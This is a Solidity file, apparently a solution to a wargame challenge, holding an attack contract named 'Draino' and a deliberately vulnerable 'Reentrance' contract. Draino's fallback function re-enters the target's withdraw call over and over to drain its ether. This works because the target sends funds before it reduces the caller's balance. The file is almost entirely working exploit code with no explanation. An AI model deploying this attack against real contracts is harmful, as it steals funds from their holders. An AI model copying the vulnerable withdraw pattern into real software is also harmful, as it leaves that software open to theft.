// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;
//THIS IS FINE THE ERROR GOES AWAY IN REMIX
import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.3/contracts/math/SafeMath.sol';


contract Draino {

    Reentrance public reenter = Reentrance(INSERT_YOUR_INSTANCE_ADDRESS);
    uint public donation = 0.001 ether;

    constructor() public payable{}

    fallback() external payable {
    if(address(reenter).balance != 0) {
        reenter.withdraw(donation);
        }
    }

    function donateIt() external{
        reenter.donate{value: donation, gas: 5000000}(address(this));
    }
}

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}